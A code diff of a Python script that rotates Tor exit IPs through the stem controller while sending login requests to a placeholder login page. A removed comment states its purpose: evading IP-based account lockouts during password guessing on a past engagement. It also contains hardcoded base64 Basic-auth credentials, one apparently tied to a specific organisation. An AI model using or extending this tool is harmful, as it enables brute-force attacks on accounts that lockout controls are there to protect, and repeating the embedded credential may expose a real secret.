@@ -4,9 +4,6 @@ import sys
 from stem import Signal
 from stem.control import Controller
 
-#This script was created to bypass IP based account lockouts using Tor. It was created for a particular engagement, so will likely need a few modifications to work universally.
-#In my case the lockout ocurred after 5 wrong logins. So every 4 guesses the script changed its IP.
-
 # signal TOR for a new connection 
 def renew_connection():
     with Controller.from_port(port = 9051) as controller:
@@ -15,13 +12,12 @@ def renew_connection():
 
 def get_tor_session():
     session = requests.session()
-    # Tor uses the 9050 port as the default socks port
     session.proxies = {'http':  'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'}
     return session
 
 url = 'https://www.website.com/login-page'
-header= {'Authorization': 'Basic bGF3c29jaWV0eTpvcGVuaXRub3dsYXc='} #Incase they are using Basic AUTH. Place base64 encoded creds here
+header= {'Authorization': 'Basic YWRtaW46YWRtaW4='} #Incase they are using Basic AUTH. Place base64 encoded creds here
 countr=0
 
 #Log file - Used to log the responses to different queries if left over a long time.
